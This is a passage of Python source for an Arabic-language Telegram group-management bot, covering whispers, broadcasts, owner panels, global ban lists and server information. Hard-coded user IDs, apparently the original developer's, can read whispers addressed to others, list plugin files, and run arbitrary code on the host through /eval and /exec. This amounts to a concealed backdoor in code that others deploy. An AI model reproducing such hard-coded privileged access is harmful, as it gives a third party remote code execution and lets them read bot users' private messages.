          return m.reply(f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
        id = m.reply_to_message.from_user.id
        mention = m.reply_to_message.from_user.mention
        if dev_pls(id, m.chat.id):
           rank = get_rank(id,m.chat.id)
           return m.reply(f'{k} هييه مايمديك تكتم {rank} يورع!')
        if not r.get(f'{id}:gban:{Dev_Zaid}'):
          return m.reply(f'「 {mention} 」\n{k} مو محظور عام من قبل\n☆')
        else:
          r.delete(f'{id}:gban:{Dev_Zaid}')
          r.srem(f'listGBAN:{Dev_Zaid}', id)
          return m.reply(f'「 {mention} 」\n{k} لغيت حظره عام\n☆')
   
# ==================== FILE: private&sudos.py ====================
'''

[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''

tio = Tio()
def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# @Client.on_message(filters.regex("^/start hmsa") & filters.private, group=-2007)
async def on_send_hmsa(c: Client, m: Message):
   id = m.text.split("hmsa")[1]
   if not wsdb.get(id):
      return await m.reply("رابط الهمسة غلط")
   else:
      get = wsdb.get(id)
      if m.from_user.id != get["from"]:
         return await m.reply("انت لم ترسل اهمس بالقروب")
      else:
         getUser = await c.get_users(get["to"])
         wsdb.set(f"hmsa-{m.from_user.id}", get)
         return await m.reply(f"ارسل همستك الموجهة الى [ {getUser.mention} ] ")

@Client.on_message(filters.regex("^/start openhms") & filters.private, group=1999)
async def open_hms(c: Client, m: Message):
   id = m.text.split("openhms")[1]
   if not wsdb.get(f"hms-{id}"):
      return await m.reply("رابط الهمسة غلط")
   else:
      data = wsdb.get(f"hms-{id}")
      caption = data.get("caption", None)
      file = data.get("file", None)
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 5117901887 and m.from_user.id != 6168217372:
         return await m.reply("☆ الهمسة غير موجهة لك يا عزيزي")
      else:
         if file:
            return await c.send_message(m.chat.id,"لقد ارسل لك ميديا والميديا ممنوعة في هذه الفترة لأنها تحت الصيانة اخبره بذالك", protect_content=True)
         else:
            return await c.send_message(
                  m.chat.id,
                  data["text"],
                  protect_content=True
               )

async def sleep_and_delete(client, chat_id, message):
    await asyncio.sleep(60)
    await client.delete_messages(chat_id, message_ids=message.message_id)

@Client.on_message(filters.private, group=-2016)
async def to_send(c: Client, m: Message):
   if m.text and re.match("^/start hmsa", m.text):
      return await on_send_hmsa(c, m)
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      users = r.smembers(f'{Dev_Zaid}:UsersList')
      count = 0
      failed = 0
      rep = await m.reply("جار الاذاعة..")
      for user in users:
         try:
            await m.copy(int(user))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
   
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      chats = r.smembers(f'enablelist:{Dev_Zaid}')
      count = 0
      failed = 0
      rep = await  m.reply("جار الاذاعة..")
      for chat in chats:
         try:
            await m.copy(int(chat))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
      
   get = wsdb.get(f"hmsa-{m.from_user.id}")
   if get:
      wsdb.delete(f"hmsa-{m.from_user.id}")
      to = get["to"]
      chat = get["chat"]
      id = get["id"]
      data = {}
      if m.media:
         if m.photo:
            file_id = m.photo.file_id
         elif m.video:
            file_id = m.video.file_id
         elif m.animation:
            file_id = m.animation.file_id
         elif m.audio:
            file_id = m.audio.file_id
         elif m.voice:
            file_id = m.voice.file_id
         elif m.sticker:
            file_id = m.sticker.file_id
         elif m.document:
            file_id = m.document.file_id
         caption = m.caption
         data ["caption"]=caption
         data["file"]=file_id
      elif m.text:
         data["text"]=m.text.html
      
      id = str(uuid.uuid4())[:6]
      data["to"]=to
      data["from"]=m.from_user.id
      wsdb.set(f"hms-{id}", data)
      url = f"https://t.me/{c.me.username}?start=openhms{id}"
      getUser = await c.get_users(to)
      await m.reply(f"تم ارسال همستك بنجاح الى {getUser.mention}")
      await c.send_message(
            chat_id=chat,
            text=f"☆ همسة سرية من < {m.from_user.mention} >\n☆ موجة الى < {getUser.mention} >",
            reply_markup=InlineKeyboardMarkup(
                  [
                     [
                     InlineKeyboardButton(
                           text="لعرض الهمسة",
                           url=url
                        )
                     ]
                  ]
               )
         )
      return await c.delete_messages(chat, get["id"])
      
@Client.on_message(filters.text & filters.private, group=1)
def delRanksHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=private_func,args=(c,m,k)).start()
    
def private_func(c,m,k):
  if r.get(f'{m.from_user.id}:sarhni'):  return 
  text = m.text
  #r.set(f'DevGroup:{Dev_Zaid}'
  name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
  channel= r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
  if text == '/start' and not dev_pls(m.from_user.id,m.chat.id):
     m.reply(text=f'''
اهلين انا ،{name} 🧚

↞ اختصاصي ادارة المجموعات من السبام والخ..
↞ كت تويت, يوتيوب, ساوند , واشياء كثير ..
↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.
''', reply_markup=InlineKeyboardMarkup ([
  [InlineKeyboardButton ('ضيفني لـ مجموعتك 🧚‍♀️', url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
  [InlineKeyboardButton (f'تحديثات {name} 🍻', url=f'https://t.me/{channel}')]
  ]))
     if not r.sismember(f'{Dev_Zaid}:UsersList',m.from_user.id):
       r.sadd(f'{Dev_Zaid}:UsersList',m.from_user.id)
       if m.from_user.username:
         username= f'@{m.from_user.username}'
       else:
         username= 'ماعنده يوزر'
       text = '''
☆ شخص جديد دخل للبوت
☆ اسمه : {}
☆ ايديه : `{}`
☆ معرفه : {}

☆ عدد المستخدمين صار {}
'''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_Zaid}:UsersList')))
       reply_markup = InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name, user_id=m.from_user.id)]])
       if r.get(f'DevGroup:{Dev_Zaid}'):
          c.send_message(
          int(r.get(f'DevGroup:{Dev_Zaid}')),
          text, reply_markup=reply_markup)
       else:
          for dev in get_devs_br():
            try:
              c.send_message(int(dev), text, disable_web_page_preview=True)
            except:
              pass
  
  if text == '/start Commands':
    return m.reply(text=f'{k} اهلين فيك باوامر البوت\n\nللاستفسار - @{channel}',
         reply_markup=InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton ('م1', callback_data=f'commands1:{m.from_user.id}'),
               InlineKeyboardButton ('م2', callback_data=f'commands2:{m.from_user.id}')
             ],
             [
              InlineKeyboardButton ('م3', callback_data=f'commands3:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('الالعاب', callback_data=f'commands4:{m.from_user.id}'),
              InlineKeyboardButton ('التسليه', callback_data=f'commands5:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('اليوتيوب', callback_data=f'commands6:{m.from_user.id}'),
             ],
           ]
         )
        )
  
  if text == '/start rules':
     m.reply(text='''
• القوانين

- ممنوع استخدام الثغرات
- ممنوع وضع اسماء مُخالفة
- ١٠ حروف مسموحه في اسمك اذا كنت بالتوب الباقي ماراح يطلع
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name} 🍻", url=f't.me/{channel}')]]))
  
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     reply_markup = ReplyKeyboardMarkup(
      [ 
        [('الاحصائيات')],
        [('تغيير المطور الاساسي')],
        [("جلب نسخة القروبات"),("جلب نسخة المستخدمين")],
        [('تفعيل البوت الخدمي'),('تعطيل البوت الخدمي')],
        [('تفعيل التحميل واليوتيوب'),('تعطيل التحميل واليوتيوب')],
        [('الردود العامه'),('الاوامر العامه')],
        [('المحظورين عام'),('المجموعات المحظورة')],
        [('اذاعة بالخاص'),('بالمجموعات اذاعة')],
        [("المكتومين عام"),("المحظورين من الالعاب")],
        [('اذاعة بالخاص'),('اذاعة بالخاص تثبيت')],
        [('اذاعة بالمجموعات'),('اذاعه بالمجموعات بالتثبيت')],
        [('رمز السورس'),('قناة السورس'),('اسم البوت')],
        [('مسح اسم البوت'),('تعيين اسم البوت')],
        [('مسح رمز السورس'),('وضع رمز السورس')],
        [('مسح قناة السورس'),('وضع قناة السورس')],
        [("السيرفر"),("الملفات"),("/eval")],
        [('مجموعة المطور')],
        [('وضع مجموعة المطور'),('مسح مجموعة المطور')],
        [('الغاء')]
      ],
      resize_keyboard=True,
      placeholder='@anas5 - @eFFb0t 🧚‍♀️'
     )
     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
       rank = 'تاج راسي ☆'
     else:
       rank = get_rank(m.from_user.id,m.from_user.id)
     return m.reply(quote=True,text=f'{k} هلا بك {rank}\n{k} قدامك لوحة التحكم ', reply_markup=reply_markup)
  if text.startswith(". "):
     text = text.split(None,1)[1]
     msg = m.reply("...", quote=True)
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     rep = requests.get(f"https://gptzaid.zaidbot.repl.co/1/text={text}").text
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     msg.edit(rep)
     
@Client.on_message(filters.text, group=30)
def sudosCommandsHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=SudosCommandsFunc,args=(c,m,k,r,channel)).start()

def SudosCommandsFunc(c,m,k,r,channel):
   if not m.from_user:  return
   if not m.chat.type == ChatType.PRIVATE:
      if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return
   else:
     if r.get(f'{m.from_user.id}:sarhni'):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if (r.get(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')) and text == 'الغاء':
       m.reply(quote=True,text=f'{k} من عيوني لغيت كل شي')
       r.delete(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}')
       return r.delete(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')

   if r.get(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:BotName',m.text)
      return m.reply(quote=True,text=f'{k} ابشر عيني المطور غيرت اسمي لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:BotChannel',m.text.replace('@',''))
      return m.reply(quote=True,text=f'{k} ابشر عيني غيرت قناة السورس لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:botkey',m.text)
      return m.reply(quote=True,text=f'{k} ابشر عيني غيرت رمز السورس لـ {m.text}')
      
   if r.get(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}')
      try:
        id = int(m.text)
      except:
        return m.reply(quote=True,text=f'{k} الايدي غلط!')
      r.set(f'DevGroup:{Dev_Zaid}', int(m.text))
      return m.reply(quote=True,text=f'{k} ابشر عيني قروب المطور لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')
      try:
        get = c.get_chat(m.text.replace('@',''))
      except:
        return m.reply(quote=True,text=f'{k} اليوزر غلط!')
      r.set(f'{Dev_Zaid}botowner', get.id)
      m.reply(quote=True,text=f'{k} ابشر نقلت ملكية البوت لـ {m.text}')
      with open ('information.py','w+') as www:
         text = 'token = "{}"\nowner_id = {}'
         www.write(text.format(c.bot_token, get.id))
         
   
   if text == 'الاحصائيات':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.smembers(f'{Dev_Zaid}:UsersList'):
         users = 0
      else:
         users = len(r.smembers(f'{Dev_Zaid}:UsersList'))
      if not r.smembers(f'enablelist:{Dev_Zaid}'):
         chats = 0
      else:
         chats = len(r.smembers(f'enablelist:{Dev_Zaid}'))
      return m.reply(quote=True,text=f'{k} هلا بك مطوري\n{k} المستخدمين ~ {users}\n{k} المجموعات ~ {chats}')
   
   if text == 'تفعيل البوت الخدمي':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.get(f'DisableBot:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} البوت الخدمي مفعل من قبل')
      else:
         r.delete(f'DisableBot:{Dev_Zaid}')
         return m.reply(quote=True,text=f'{k} ابشر فعلت البوت الخدمي')
   
   if text == 'تعطيل البوت الخدمي':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if r.get(f'DisableBot:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} البوت الخدمي معطل من قبل')
      else:
         r.set(f'DisableBot:{Dev_Zaid}',1)
         return m.reply(quote=True,text=f'{k} ابشر عطلت البوت الخدمي')
   
   if text == 'تفعيل التحميل واليوتيوب':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.get(f':disableYT:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} التحميل مفعل من قبل')
      else:
         r.delete(f':disableYT:{Dev_Zaid}')
         return m.reply(quote=True,text=f'{k} ابشر فعلت التحميل')
   
   if text == 'تعطيل التحميل واليوتيوب':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if r.get(f':disableYT:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} التحميل معطل من قبل')
      else:
         r.set(f':disableYT:{Dev_Zaid}',1)
         return m.reply(quote=True,text=f'{k} ابشر عطلت التحميل')
   
   if text == 'الردود العامه' and m.chat.type == ChatType.PRIVATE:
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     else:
      if not r.smembers(f'FiltersList:{Dev_Zaid}'):
       return m.reply(quote=True,text=f'{k} مافيه ردود عامه مضافه')
      else:
       text = 'ردود البوت:\n'
       count = 1
       for reply in r.smembers(f'FiltersList:{Dev_Zaid}'):
          rep = reply
          type = r.get(f'{rep}:filtertype:{Dev_Zaid}')
          text += f'\n{count} - ( {rep} ) ࿓ ( {type} )'
          count += 1
       text += '\n☆'
       return m.reply(quote=True,text=text, disable_web_page_preview=True)
   
   if text == 'المستخدمين المحظورين' or text == 'المحظورين عام':
     if not dev_pls(m.from_user.id, m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( المطور وفوق ) بس')
     else:
        if not r.smembers(f'listGBAN:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافيه حمير محظورين')
        else:
           text = 'الحمير المحظورين عام:\n'
           count = 1
           for user in r.smembers(f'listGBAN:{Dev_Zaid}'):
               try:
                  get = c.get_users(int(user))
                  mention = '@'+get.username if get.username else get.mention
                  id = get.id
               except:
                  mention = f'[{int(user)}](tg://user?id={int(user)})'
                  id = int(user)
               text += f'{count}) {mention} ~ ( `{id}` )\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'المحظورين من الالعاب':
     if not dev_pls(m.from_user.id, m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( المطور وفوق ) بس')
     else:
        if not r.smembers(f'listGBANGAMES:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافيه حمير محظورين من الالعاب')
        else:
           text = 'الحمير المحظورين عام من الالعاب:\n'
           count = 1
           for user in r.smembers(f'listGBANGAMES:{Dev_Zaid}'):
               try:
                  get = c.get_users(int(user))
                  mention = '@'+get.username if get.username else get.mention
                  id = get.id
               except:
                  mention = f'[{int(user)}](tg://user?id={int(user)})'
                  id = int(user)
               text += f'{count}) {mention} ~ ( `{id}` )\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'المجموعات المحظورة':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     else:
        if not r.smembers(f':BannedChats:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافي قروب محظور عام')
        else:
           text = 'المجموعات المحظورة عام:\n'
           count = 1
           for user in r.smembers(f':BannedChats:{Dev_Zaid}'):
               text += f'{count}) {user}\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'رمز السورس':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     return m.reply(quote=True,text=f'`{k}`')
   
   if text == 'قناة السورس':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     if not r.get(f'{Dev_Zaid}:BotChannel'):
       return m.reply(quote=True,text=f'{k} قناة السورس مو معينة')
     else:
       cha = r.get(f'{Dev_Zaid}:BotChannel')
       return m.reply(quote=True,text=f'@{cha}')
   
   if text == 'اسم البوت':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     if not r.get(f'{Dev_Zaid}:BotName'):
       return m.reply(quote=True,text=f'{k} مافي اسم للبوت')
     else:
       name = r.get(f'{Dev_Zaid}:BotName')
       return m.reply(quote=True,text=name)
   
   if text == 'مجموعة المطور' and m.chat.type == ChatType.PRIVATE:
     if not dev_pls(m.from_user.id,m.chat.id):
        return
     else:
        if not r.get(f'DevGroup:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مجموعة المطور مو معينة')
        else:
           id = int(r.get(f'DevGroup:{Dev_Zaid}'))
           link = c.get_chat(id).invite_link
           return m.reply(quote=True,text=link, protect_content=True)
   
   if text == 'تعيين اسم البوت':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل اسمي الجديد الحين')
   
   if text == 'مسح اسم البوت':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'{Dev_Zaid}:BotName')
     return m.reply(quote=True,text=f'{k} ابشر مسحت اسم البوت')
   
   if text == 'وضع قناة السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل قناة السورس الحين')
   
   if text == 'مسح قناة السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'{Dev_Zaid}:BotChannel')
     return m.reply(quote=True,text=f'{k} ابشر مسحت قناة السورس')
   
   if text == 'وضع رمز السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل رمز السورس الحين')
   
   if text == 'مسح رمز السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{Dev_Zaid}:botkey', '⇜')
     return m.reply(quote=True,text=f'{k} ابشر مسحت رمز السورس')
   
   if text == 'وضع مجموعة المطور':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل ايدي القروب الحين')
   
   if text == 'مسح مجموعة المطور':
     if not devp_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'DevGroup:{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} ابشر مسحت مجموعة المطور')
   
   if text == 'تغيير المطور الاساسي':
     if not devp_pls(m.from_user.id,m.chat.id):
        return
     else:
        r.set(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}',1,ex=600)
        return m.reply(quote=True,text=f'{k} ارسل يوزر المطور الجديد الحين')
   
   if text == 'تحديث':
     if devp_pls(m.from_user.id,m.chat.id):
       m.reply(quote=True,text=f'{k} تم تحديث الملفات')
       python = sys.executable
       os.execl(python, python, *sys.argv)
   
   if text == 'الملفات':
     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
        text = '——— ملفات السورس ———'
        a = os.listdir('Plugins')
        a.sort()
        count = 1
        for file in a:
          if file.endswith('.py'):
            text += f'\n{count}) `{file}`'
            count += 1
        text += f'\n——— @{channel} ———'
        return m.reply(quote=True,text=text, disable_web_page_preview=True)
        
   if text == 'اذاعة بالخاص':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      r.set(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}',1,ex=300)
      return m.reply(f"{k} ارسل الاذاعة الحين")

   if text == 'اذاعة بالقروبات':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      r.set(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}',1,ex=300)
      return m.reply(f"{k} ارسل الاذاعة الحين")
   
   if text == 'السيرفر' or text == 'معلومات السيرفر':
     if devp_pls(m.from_user.id,m.chat.id):
       text = '——— SYSTEM INFO ———'
       uname = platform.uname()
       version = lsb_release.get_distro_information()['DESCRIPTION']
       text += f"\n{k} النظام : {uname.system}"
       text += f"\n{k} الاصدار: `{version}`"
       text += '\n——— R.A.M INFO ———'
       svmem = psutil.virtual_memory()
       text += f"\n{k} رامات السيرفر: ` {get_size(svmem.total)}`"
       text += f"\n{k} المستهلك: ` {get_size(svmem.used)}/{get_size(svmem.available)}`"
       text += f"\n{k} نسبة الاستهلاك: `{svmem.percent}%`"
       text += '\n——— HARD DISK ———'
       hard = psutil.disk_partitions()[0]
       usage = psutil.disk_usage(hard.mountpoint)
       text += f"\n{k} ذاكرة التخزين: `{get_size(usage.total)}`"
       text += f"\n{k} المستهلك: `{get_size(usage.used)}`"
       text += f"\n{k} نسبة الاستهلاك: `{usage.percent}%`"
       text += '\n——— U.P T.I.M.E ———'
       uptime = time.strftime('%dD - %HH - %MM - %Ss', time.gmtime(time.time() - psutil.boot_time()))
       text += f'\n{uptime}'
       text += '\n\n༄'
       return m.reply(quote=True,text=text, disable_web_page_preview=True)
   
   if text == 'جلب نسخة القروبات' and devp_pls(m.from_user.id,m.chat.id):
     list = []
     date = datetime.now()
     for chat in r.smembers(f'enablelist:{Dev_Zaid}'):
        list.append(int(chat))
     with open(f'{date}.json', 'w+') as w:
        w.write(json.dumps({"botUsername": botUsername,"botID":c.me.id,"Chats":list},indent=4,ensure_ascii=False))
     m.reply_document(f'{date}.json',quote=True)
     os.remove(f'{date}.json')
   
   if text == 'جلب نسخة المستخدمين' and devp_pls(m.from_user.id,m.chat.id):
     list = []
     date = datetime.now()
     for chat in r.smembers(f'{Dev_Zaid}:UsersList'):
        list.append(int(chat))
     with open(f'{date}.json', 'w+') as w:
        w.write(json.dumps({"botUsername": botUsername,"botID":c.me.id,"Users":list},indent=4,ensure_ascii=False))
     m.reply_document(f'{date}.json',quote=True)
     os.remove(f'{date}.json')

   if text == 'المكتومين عام':
      if not dev_pls(m.from_user.id,m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'listMUTE:{Dev_Zaid}'):
          return m.reply(quote=True,text=f'{k} مافيه مكتومين عام')
        else:
          text = '- المكتومين عام:\n\n'
          count = 1
          for PRE in r.smembers(f'listMUTE:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(PRE))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(PRE)})'
               id = int(PRE)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(quote=True,text=text)

   if text.startswith('رابط ') and dev2_pls(m.from_user.id,m.chat.id):
     try:
        id = int(text.split()[1])
        gg = c.get_chat(id)
        m.reply(quote=True,text=f'[{gg.title}]({gg.invite_link})',disable_web_page_preview=True)
     except Exception as e:
        print (e)
     
       
   
async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(filters.command("eval") & filters.user(6168217372))
async def executor(client, message):
    if len(message.command) < 2 and not message.reply_to_message:
        return await message.reply("» هات أمر عشان انفذ !")
    if len(message.command) >= 2:
      cmd = message.text.split(None,1)[1]
    else:
      cmd = message.reply_to_message.text    
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "SUCCESS"
    final_output = f"`OUTPUT:`\n\n```{evaluation.strip()}```"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(evaluation.strip()))
        
        await message.reply_document(
            document=filename,
            caption=f"`INPUT:`\n`{cmd[0:980]}`\n\n`OUTPUT:`\n`attached document`",
            quote=False
        )
        await message.delete()
        os.remove(filename)
    else:
        await message.reply(final_output)
   
   
   
langslist = tio.query_languages()
langs_list_link = "https://amanoteam.com/etc/langs.html"

strings_tio = {
  "code_exec_tio_res_string_no_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Stats:</b><code>{statsformat}</code>",
  "code_exec_tio_res_string_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Errors:</b>\n<code>{errformat}</code>",
  "code_exec_err_string": "Error: The language <b>{langformat}</b> was not found. Supported languages list: {langslistlink}",
  "code_exec_inline_send": "Language: {langformat}",
  "code_exec_err_inline_send_string": "Language {langformat} not found."
}

@Client.on_message(filters.command("exec") & filters.user(6168217372))
async def exec_tio_run_code(c: Client, m: Message):
    execlanguage = m.command[1]
